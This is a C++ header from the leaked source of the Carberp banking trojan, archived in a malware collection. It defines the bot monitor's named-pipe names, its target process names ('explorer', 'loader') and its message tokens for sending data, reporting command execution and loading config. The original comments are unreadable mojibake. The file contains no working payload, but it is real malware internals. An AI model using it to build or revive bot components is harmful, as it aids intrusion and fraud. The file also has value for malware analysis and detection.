/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// ---------------------------------------------------------------------------
//  ��������� ������ ����������� ������ ����
// ---------------------------------------------------------------------------

#ifndef BotMonitorConstsH
#define BotMonitorConstsH
// ---------------------------------------------------------------------------

// ��������� ��� ������ � ��������� ����
namespace BotMonitor
{
    // ��� ��������� ����� ��������
	const static char ServerName[] = "BTMonitor_Server";

	// ��� ���������� ����� ��������
	const static char ClientName[] = "BTMonitor_Client";

	// ����� ��������� � ������� ����� ����������� �������
	const static char ProcessExplorer[] = "explorer";
	const static char ProcessLoader[]   = "loader";



	//-------------- ��������� ---------------------//

	// ��� ���������� ��� ����� � �������
	// ������: ���_�������:���_�����
	const static char MessageSendCab[] = "senddata_cab";

	// ������ �������� ��� �����
	const static char MessageSendCabError[] = "senddata_error_cab";



	// ������� ��������� �����
    const static char TaskNoCommands[]    = "task_no_commands"; // ������� �����������
	const static char TaskExecCommandOk[] = "task_cmd_exec_ok"; // ������� ������� ���������
	const static char TaskExecCommandEr[] = "task_cmd_exec_er"; // ������� �� ���������


	// ��������� ��������
	const static char ConfigLoadFile[]    = "config_load_file"; // ����������� ��������� ������ �� �����
	const static char ConfigMaskExec[]    = "config_mask_exec"; // ��������� �����
	const static char ConfigDataExec[]    = "config_data_exec"; // ��������� ������
}


// ---------------------------------------------------------------------------
#endif
